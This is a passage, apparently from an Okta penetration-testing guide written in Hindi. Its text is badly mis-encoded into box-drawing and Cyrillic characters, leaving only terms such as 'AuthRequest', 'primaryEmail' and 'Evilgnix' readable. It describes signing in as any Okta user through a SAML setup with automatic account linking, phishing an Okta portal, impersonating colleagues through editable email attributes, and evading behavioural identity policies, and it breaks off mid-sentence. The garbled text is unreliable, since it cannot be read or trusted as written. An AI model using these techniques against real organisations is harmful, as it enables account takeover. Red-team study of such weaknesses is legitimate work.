рдЕрдВрдд рдореЗрдВ, рд╣рдореЗрдВ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ `рдорд┐рд▓рд╛рди рдХреЗ рдЦрд┐рд▓рд╛рдл` рдХреЛ `Okta рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рдИрдореЗрд▓` рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ `рдЦрд╛рддрд╛ рд▓рд┐рдВрдХ рдиреАрддрд┐` рдХреЛ `рд╕реНрд╡рдЪрд╛рд▓рд┐рдд` рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрдВ рдореМрдЬреВрджрд╛ Okta рдЦрд╛рддреЛрдВ рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓ рд╕рдХреЗ:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

рд╕рдм рдХреБрдЫ рд╕рд╣реЗрдЬреЗ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

рдлрд┐рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рдФрд░ `AuthRequest` рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо `Assertion Consumer Service URL` рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рд╕реЗ рд╣рдорд╛рд░реЗ рдЖрдВрддрд░рд┐рдХ SAML рд╕рд░реНрд╡рд░ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рд╣рдо рдПрдХ рдИрдореЗрд▓ рдкрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдХрд┐рд╕реА рднреА Okta рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдЙрдирдХреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЪрд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕реЗ [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c) рдореЗрдВ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ

### Evilgnix рдХреЗ рд╕рд╛рде Okta рдкреЛрд░реНрдЯрд▓ рдХрд╛ рдлрд┐рд╢рд┐рдВрдЧ

[**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдПрдХ Okta рдкреЛрд░реНрдЯрд▓ рдХреЗ рдЦрд┐рд▓рд╛рдл рдлрд┐рд╢рд┐рдВрдЧ рдЕрднрд┐рдпрд╛рди рдХреИрд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПред

### рд╕рд╣рдХрд░реНрдореА рдЕрдиреБрд░реВрдкрдг рд╣рдорд▓рд╛

Okta рдореЗрдВ рд╣рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ (рдЬреИрд╕реЗ рдИрдореЗрд▓ рдпрд╛ рдкрд╣рд▓рд╛ рдирд╛рдо) рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рдПрдХ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдПрдХ **рд╡рд┐рд╢реЗрд╖рддрд╛** рдХреЗ рд░реВрдк рдореЗрдВ ID рдХреЗ рд░реВрдк рдореЗрдВ **рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣реА рд╣реИ** рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЙрд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдореЗрдВ **рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХреЗрдЧрд╛**ред

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдРрдк рдлрд╝реАрд▓реНрдб **`userName`** рдХрд╛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдЙрд╕реЗ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдЖрдорддреМрд░ рдкрд░ рдЙрд╕ рдлрд╝реАрд▓реНрдб рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рд╕рдХрддреЗ рд╣реИрдВ), рд▓реЗрдХрд┐рди рдпрджрд┐ рдпрд╣ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ рдХрд┐ **`primaryEmail`** рдЖрдк рдЙрд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ рд╕рд╣рдХрд░реНрдореА рдХреЗ рдИрдореЗрд▓ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЙрд╕реЗ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдкрдХреЛ рдИрдореЗрд▓ рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рдкрд░рд┐рд╡рд░реНрддрди рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдЕрдиреБрдХрд░рдг рдЗрд╕ рдмрд╛рдд рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреИрд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдХреЗрд╡рд▓ рдЙрдирдореЗрдВ рд╕реЗ рдЬреЛ рдЖрдкрдиреЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдЧрдП рдлрд╝реАрд▓реНрдб рдХрд╛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЕрджреНрдпрддрд┐рдд рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрдВрдЧреЗред\
рдЗрд╕рд▓рд┐рдП, рдРрдк рдХреЛ рдпрд╣ рдлрд╝реАрд▓реНрдб рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рд╣реИ:

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

рдореИрдВрдиреЗ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдЕрдиреНрдп рдРрдкреНрд╕ рднреА рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдереЗ рд▓реЗрдХрд┐рди Okta рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдЙрд╕ рдлрд╝реАрд▓реНрдб рдХреЛ рдирд╣реАрдВ рдерд╛ (рдЕрдВрдд рдореЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдРрдкреНрд╕ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ)ред

рд╣рд░ рдРрдк рдкрд░ рдХрд┐рд╕реА рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛ рдЗрд╕реЗ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛!

## рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрд╣рдЪрд╛рди рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЯрд╛рд▓рдирд╛ <a href="#9fde" id="9fde"></a>

рдпрджрд┐ рдЗрд╕рдХреА рдкрд╣рд▓реЗ рд╕реЗ рдЦреБрд▓рд╛рд╕рд╛ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдкрддрд╛ рдирд╣реАрдВ рдЪрд▓реЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрд╣рдЪрд╛рди рдиреАрддрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдХреА рдЧрдИ рд╣реИрдВ рдЬрдм рддрдХ рдЖрдк рдЙрдирд╕реЗ рд╕рд╛рдордирд╛ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред Okta рдХреА рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ рдкрд╣рдЪрд╛рди рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЯрд╛рд▓рдиреЗ рдХрд╛ рдПрдХ **рд╕рдВрднрд╛рд╡рд┐рдд рддрд░реАрдХрд╛** рд╣реИ рдХрд┐ рдЖрдк рдмрд╕ рдореБрдЦреНрдп Okta рдбреИрд╢рдмреЛрд░реНрдб рд╕реЗ рдмрдЪреЗрдВ рдФрд░ рд╕реАрдзреЗ Okta рдПрдк
